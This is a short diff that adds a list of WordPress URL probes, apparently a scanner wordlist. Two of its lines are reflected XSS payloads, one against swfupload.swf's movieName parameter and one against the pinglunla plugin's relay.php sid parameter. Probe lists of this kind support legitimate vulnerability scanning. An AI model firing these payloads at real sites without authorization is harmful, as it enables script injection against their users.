@@ -1,0 +1,6 @@
+/WordPr/wp-content/themes/twentyeleven/index.php
+/wp-content/themes/twentyeleven/index.php
+/wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//
+/wp-content/plugins/pinglunla/relay.php?sid=ec51555f3e5e125257457a73609bdbe15cb7c29d"></script><script>alert(0)</script><script%20src="
+/wp-content/plugins/pinglunla/relay.php?sid=new sid here
+/?s_p_c_t={Random id}&product_id={Random id}&view=showproduct&page_num={Random id}&back={Random id}
